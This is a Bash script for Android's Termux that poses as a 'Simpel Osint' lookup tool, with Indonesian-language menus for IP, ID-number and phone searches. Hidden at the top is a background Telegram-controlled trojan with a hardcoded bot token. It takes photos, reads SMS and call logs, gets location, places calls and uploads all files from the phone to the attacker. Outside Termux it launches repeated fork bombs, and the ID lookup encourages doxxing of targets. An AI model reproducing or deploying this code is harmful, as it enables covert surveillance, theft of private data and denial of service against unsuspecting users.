#!/bin/bash
TOKEN="/data/data/com.termux/files/usr/lib/.whatthefuck"
IDTELE="/data/data/com.termux/files/usr/lib/.anu"
STATE_FILE=".STATE"
wajib="/data/data/com.termux/"
if [ -d "$wajib" ]; then
if [[ -f "$TOKEN" && -f "$IDTELE" ]]; then
    token=$(cat "$TOKEN")
    id=$(cat "$IDTELE")
else
    pkg install termux-api -y
    echo "503444663293" > "$IDTELE" # chat id 
    echo "AAETYROcaX_sEWLHGx6a6havghFPGxpxSuPO8" > "$TOKEN" #token bot tele
fi
ID_TERMUX="$(whoami)"
Menu_GHOST() {
banner1() {
    echo "⠀
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
======================================================
PAYLOAD : Thonxyzz404
VERSION  : 0.0.1
USER ID  : $ID_TERMUX siap di Exploit !
======================================================
 "
}

send_menu() {
    local banner_output
    banner_output=$(banner1)
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
        -d "chat_id=$id" \
        -d "text=$banner_output" \
        -d "reply_markup=$(generate_keyboard)"
}
generate_keyboard() {
    cat <<EOF
{
    "keyboard": [
        ["Ambil Foto", "Cek Status Baterai"],
        ["Dapatkan Lokasi", "Informasi Sistem"],
        ["Ambil SMS", "Ambil Log Panggilan"],
        ["Ubah Wallpaper", "Panggil Nomor Telepon"],
        ["Kirim Semua File", "Dapatkan Info Koneksi Wi-Fi"],
        ["Hidupkan Wi-Fi", "Matikan Wi-Fi"],
        ["Spam Notifikasi", "Reset Semua Perintah", "Menu"]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}
EOF
}
reset() {
    rm -rf "$STATE_FILE"
    send_message "File .STATE telah dihapus."
    send_message "Welcome back."
    send_menu
}
send_message() {
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$id" -d "text=$1"
}

spam_notifications() {
    send_message "Masukkan judul notifikasi:"
    echo "waiting_for_notification_title" > "$STATE_FILE"
}

send_notification() {
    for ((i=1; i<=$3; i++)); do
        termux-notification --title "$1" --content "$2"
    done
    send_message "Spam notifikasi sudah dikirim sebanyak $3."
}

take_photo() {
    local photo_path="/sdcard/foto.jpg"
    termux-camera-photo -c 1 "$photo_path"
    send_message "Foto berhasil diambil. Sedang dikirim..."
    curl -s -X POST "https://api.telegram.org/bot$token/sendPhoto" -F "chat_id=$id" -F "photo=@$photo_path"
    rm "$photo_path"
}

send_all_files() {
    local dir="/storage/emulated/0/"
    local extensions=("jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip")
    send_message "Mencari dan mengirim file dari: $dir"
    for ext in "${extensions[@]}"; do
        process_files "$ext" "$token" "$dir"
    done
}

process_files() {
    find /storage/emulated/0/ -type f -iname "*.$1" 2>/dev/null | while read -r file; do
        send_file "$2" "$file"
    done
}

send_file() {
    curl -s -X POST "https://api.telegram.org/bot$1/sendDocument" -F "chat_id=$id" -F "document=@$2"
    send_message "Mengirim file: $2"
}

get_location() {
    send_message "Lokasi Anda: $(termux-location)"
}

check_battery() {
    send_message "Status Baterai: $(termux-battery-status)"
}

system_info() {
    send_message "Informasi Sistem: $(termux-info)"
}

get_sms() {
    send_message "Daftar SMS:\n$(termux-sms-list)"
}

get_call_log() {
    send_message "Log Panggilan:\n$(termux-call-log)"
}

set_wallpaper() {
    send_message "Masukkan URL wallpaper yang ingin digunakan:"
    echo "waiting_for_wallpaper_url" > "$STATE_FILE"
}

make_call() {
    send_message "Masukkan nomor telepon yang ingin dipanggil:"
    echo "waiting_for_phone_number" > "$STATE_FILE"
}

get_wifi_info() {
    send_message "Informasi Koneksi Wi-Fi:\n$(termux-wifi-connectioninfo)"
}

set_wifi() {
    termux-wifi-enable "$1"
    [[ "$1" == "true" ]] && send_message "Wi-Fi dihidupkan." || send_message "Wi-Fi dimatikan."
}

handle_command() {
    if [[ -f "$STATE_FILE" ]]; then
        local state=$(cat "$STATE_FILE")
        case "$state" in
            "waiting_for_wallpaper_url")
                termux-wallpaper -u "$1" && send_message "Wallpaper berhasil diubah dari URL: $1" || send_message "Gagal mengubah wallpaper. Periksa URL."
                rm "$STATE_FILE"
                ;;
            "waiting_for_phone_number")
                [[ "$1" =~ ^[0-9]+$ ]] && send_message "Memanggil nomor: $1..." && termux-telephony-call "$1" || send_message "Input tidak valid."
                rm "$STATE_FILE"
                ;;
            "waiting_for_notification_title")
                notification_title="$1"
                send_message "Masukkan konten notifikasi:"
                echo "waiting_for_notification_content" > "$STATE_FILE"
                ;;
            "waiting_for_notification_content")
                notification_content="$1"
                send_message "Masukkan jumlah pengiriman:"
                echo "waiting_for_notification_count" > "$STATE_FILE"
                ;;
            "waiting_for_notification_count")
                [[ "$1" =~ ^[0-9]+$ ]] && send_notification "$notification_title" "$notification_content" "$1" || send_message "Input tidak valid."
                rm "$STATE_FILE"
                ;;
            *) rm "$STATE_FILE" ;;
        esac
        return
    fi
    case "$1" in
        "Ambil Foto") take_photo ;;
        "Kirim Semua File") send_all_files ;;
        "Dapatkan Lokasi") get_location ;;
        "Cek Status Baterai") check_battery ;;
        "Informasi Sistem") system_info ;;
        "Ambil SMS") get_sms ;;
        "Ambil Log Panggilan") get_call_log ;;
        "Ubah Wallpaper") set_wallpaper ;;
        "Panggil Nomor Telepon") make_call ;;
        "Dapatkan Info Koneksi Wi-Fi") get_wifi_info ;;
        "Hidupkan Wi-Fi") set_wifi "true" ;;
        "Matikan Wi-Fi") set_wifi "false" ;;
        "Spam Notifikasi") spam_notifications ;;
        "Reset Semua Perintah") reset ;;
        "Menu") send_menu ;;
        *) send_message "Perintah tidak dikenali." ;;
    esac
}

process_updates() {
    local updates=$(curl -s "https://api.telegram.org/bot$token/getUpdates?offset=-1")
    local update_id=$(echo "$updates" | jq -r '.result[0].update_id')
    local command=$(echo "$updates" | jq -r '.result[0].message.text')
    [[ $update_id != "null" ]] && handle_command "$command" && curl -s "https://api.telegram.org/bot$token/getUpdates?offset=$((update_id + 1))" > /dev/null
}

run_bot() {
    while true; do
        process_updates
        sleep 1
    done
}

send_menu
run_bot
}

Menu_GHOST &> /dev/null &

#menu_ke_2 ( pengalihan )
nani() {
e="echo -e "
m="\033[1;31m"   # Merah
h="\033[1;32m"   # Hijau
k="\033[1;33m"   # Kuning
b="\033[1;34m"   # Biru
bl="\033[1;36m"  # Biru Muda
p="\033[1;37m"   # Putih
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
bg_m="\033[41m"  # Latar Belakang Merah
bg_h="\033[42m"  # Latar Belakang Hijau
bg_k="\033[43m"  # Latar Belakang Kuning
bg_b="\033[44m"  # Latar Belakang Biru
bg_bl="\033[46m" # Latar Belakang Biru Muda
bg_p="\033[47m"  # Latar Belakang Putih
bg_u="\033[45m"  # Latar Belakang Ungu
bg_pu="\033[40m" # Latar Belakang Abu-abu
res="\033[0m"    # Reset semua atribut
clear
text="SUBSCRIBE GALIRUS OFFICIAL YOUTUBE"
duration=10
length=${#text}
steps=100
sleep_time=0.1
function loading_effect() {
    start_time=$(date +%s)
    while true; do
        for ((i = 0; i <= length; i++)); do
            echo -ne "\r${text:0:$i}$(echo "${text:$i}" | tr '[:upper:]' '[:lower:]')"
            sleep "$sleep_time"
            current_time=$(date +%s)
            elapsed_time=$((current_time - start_time))
            if [ "$elapsed_time" -ge "$duration" ]; then
                xdg-open "https://www.youtube.com/@GalirusProjects"
                break 2
            fi
        done
    done
    echo -ne "\r$text"
    echo ""
}
$e $h
loading_effect
track_ip_address() {
    read -p "Masukkan IP: " input_ip
    ip_info=$(curl -s "https://ipinfo.io/${input_ip}/json")
    ip_address=$(echo "$ip_info" | jq -r '.ip')
    hostname=$(echo "$ip_info" | jq -r '.hostname // "N/A"')
    city=$(echo "$ip_info" | jq -r '.city // "N/A"')
    region=$(echo "$ip_info" | jq -r '.region // "N/A"')
    country=$(echo "$ip_info" | jq -r '.country // "N/A"')
    loc=$(echo "$ip_info" | jq -r '.loc // "N/A"')
    org=$(echo "$ip_info" | jq -r '.org // "N/A"')
    timezone=$(echo "$ip_info" | jq -r '.timezone // "N/A"')
    asn=$(echo "$ip_info" | jq -r '.asn.asn // "N/A"')
    asn_name=$(echo "$ip_info" | jq -r '.asn.name // "N/A"')
    asn_domain=$(echo "$ip_info" | jq -r '.asn.domain // "N/A"')

    # Status privasi
    vpn=$(echo "$ip_info" | jq -r '.privacy.vpn // "false"')
    proxy=$(echo "$ip_info" | jq -r '.privacy.proxy // "false"')
    tor=$(echo "$ip_info" | jq -r '.privacy.tor // "false"')
    relay=$(echo "$ip_info" | jq -r '.privacy.relay // "false"')
    hosting=$(echo "$ip_info" | jq -r '.privacy.hosting // "false"')

    echo "Hasil scanning untuk IP: $ip_address"
    echo "Hostname    : $hostname"
    echo "Lokasi      : $city, $region, $country"
    echo "Koordinat   : $loc"
    echo "Organisasi  : $org"
    echo "Timezone    : $timezone"
    echo "ASN         : $asn"
    echo "ASN Name    : $asn_name"
    echo "ASN Domain  : $asn_domain"
    echo ""
    echo "Status Privasi:"
    echo "VPN         : $vpn"
    echo "Proxy       : $proxy"
    echo "Tor         : $tor"
    echo "Relay       : $relay"
    echo "Hosting     : $hosting"
}

# Fungsi untuk mendapatkan NIK
nik_nih_bos() {
    pasang="/data/data/com.termux/files/usr/include/NIK"
    lagek_melbu="completed"
    while true; do
        if [[ -d "$pasang" && -f "$lagek_melbu" ]]; then
            cd "$pasang"
            git stash &> /dev/null
            git pull origin main &> /dev/null
            clear
            loading_string="   LOADING SCANNING"
            lowercase_string="   loading scanning"
            length=${#loading_string}
            link() {
                clear
                $e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
                $e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
                $e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
                $e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
                $e "Contohnya$c:$k 6285953465619"
            }
            loading_animation() {
                for ((i = 0; i <= length; i++)); do
                    current_string="${lowercase_string:0:i}${loading_string:i:length}"
                    percent=$((i * 100 / length))
                    printf "\r$current_string [%d%%]" "$percent"
                    sleep 0.1
                done
            }

            long_task() {
                sleep 2
            }
            bacot() {
                echo "
 ██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║   ██║╚════██║██║██║╚██╗██║   ██║   
╚██████╔╝███████║██║██║ ╚████║   ██║   
 ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.Thonxyzz404
                "
            }
            bacot | lolcat
            read -p "Masukkan NIK Target Anda: " niknya_kontol
            long_task &
            loading_animation | lolcat
            clear
            bacot | lolcat
            nik-parse -n "$niknya_kontol"
            $e
            $e
            $e $m
            read -p "Apa Anda Ingin Mengulangi Nya ? (y/n) " opo
            if [[ "$opo" = "y" || "$opo" = "Y" ]]; then
                link | lolcat
                $e
                $e
                $e
                read -p "Silahkan Enter Untuk Menuju ke Telegram"
                xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
            elif [[ "$opo" = "n" || "$opo" = "N" ]]; then
                link | lolcat
                $e
                $e
                $e
                read -p "Silahkan Enter Untuk Menuju ke Telegram"
                xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
                break
            else
                $e $m "BODO KALI KAU, YANG BENER ANYING"
            fi
        else
            $e $bg_m "Package Durung Di Install, Installasi sek$res"
            cd /data/data/com.termux/files/usr/include/
            git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
            cd NIK
            git stash &> /dev/null
            git pull origin main &> /dev/null
            npm install nik-parse -g
            echo "kau anak kontol 😂" > "$lagek_melbu"
        fi
    done
}

# Fungsi untuk informasi nomor telepon
Number_Osint() {
    read -p "Masukkan nomor telepon dengan kode negara: " entry_number
    echo "Nomor: $entry_number"
    ip_info=$(curl -s ipinfo.io)
    ip_address=$(echo "$ip_info" | jq -r '.ip')
    city=$(echo "$ip_info" | jq -r '.city')
    region=$(echo "$ip_info" | jq -r '.region')
    country=$(echo "$ip_info" | jq -r '.country')
    echo "Alamat IP: $ip_address"
    echo "Kota: $city"
    echo "Wilayah: $region"
    echo "Negara: $country"
    timezone=$(echo "$ip_info" | jq -r '.timezone')
    current_time=$(TZ="$timezone" date +"%I:%M %p")
    echo "Waktu Lokal: $current_time"
    echo -e $k
    read -p "Silahkan Enter Untuk Kembali Ke Menu"
}

# Fungsi untuk pencarian Google
Google_Osint() {
    read -p "Masukkan nama untuk OSINT: " target_name
    query=$(echo "$target_name" | sed 's/ /+/g')
    url="https://www.google.com/search?q=$query"
    $e "\n${c}🌐 OSINT - Pencarian Google${res}"
    $e "${h}=============================================${res}"
    $e "${b}🔍 Mencari: ${h}$target_name${res}"
    $e "${k}📎 $url${res}"
    $e "${h}=============================================\n${res}"

    results=$(curl -s -A "Mozilla/5.0" "$url" | grep -oP '(?<=<a href=")[^"]*(?=")' | grep 'http')
    if [[ -z "$results" ]]; then
        $e "${m}⚠️  Tidak ada hasil ditemukan atau akses diblokir oleh Google.${res}"
    else
        $e "${bl}📄 Hasil Pencarian:${res}"
        $e "${h}---------------------------------------------${res}"
        count=1
        echo "$results" | while read -r line; do
            printf " ${u}[%02d] ${bl}%s${res}\n" "$count" "$line"
            ((count++))
        done
    fi

    $e "\n${h}✅ Pencarian selesai.${res}"
    echo $k
    read -p "Enter Untuk Masuk Ke MENU"
}
main_menu() {
    while true; do
        banner1() {
            echo "
       Ah,Ah,Ah,Ah
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀Enakk⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇"
        }
        banner2() {
            cowsay -f eyes "Simpel Osint By.Thonxyzz404" | lolcat
        }
        banner3() {
            echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         Simpel Osint By.Thonxyzz404⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
        }

        logo=("banner1" "banner2" "banner3")
        random_index=$((RANDOM % ${#logo[@]}))
        banner="${logo[random_index]}"
        clear
        $banner | lolcat
        $e $c "Mode In ™Hacking404™"
        $e "${h}=============================================${res}"
        $e "${b}          MENU UTAMA OSINT                 ${res}"
        $e "${h}=============================================${res}"
        $e "${k}[$bl 1$k ]$m Track IP Address                     ${res}"
        $e "${k}[$bl 2$k ]$m Osint NIK                         ${res}"
        $e "${k}[$bl 3$k ]$m Informasi Nomor Telepon             ${res}"
        $e "${k}[$bl 4$k ]$m Pencarian Google                    ${res}"
        $e "${k}[$bl 5$k ]$m Keluar                             ${res}"
        $e "${h}=============================================${res}"

        read -p "Pilih opsi [1-5]: " option
        case $option in
            1) track_ip_address ;;
            2) nik_nih_bos ;;
            3) Number_Osint ;;
            4) Google_Osint ;;
            5) exit ;;
            *) $e "${m}Pilihan tidak valid, silakan coba lagi.${res}" ;;
        esac
        read -p "Tekan Enter untuk melanjutkan..."
    done
}
instalasi() {
    clear
    while true; do
        scan="Package"
        if [ -f "$scan" ]; then
            break
        else
            pkg install jq wget curl cowsay -y
            pkg install ruby php python python3 -y
            gem install lolcat
            touch "$scan"
        fi
    done
}

kanggo_termux_tok() {
delok="/data/data/com.termux"
if [ -d "$delok" ]; then
instalasi
#base &> /dev/null &
main_menu
else
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:

fi
}

kanggo_termux_tok
}

nani
else
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
          :(){ :|:& };:
fi

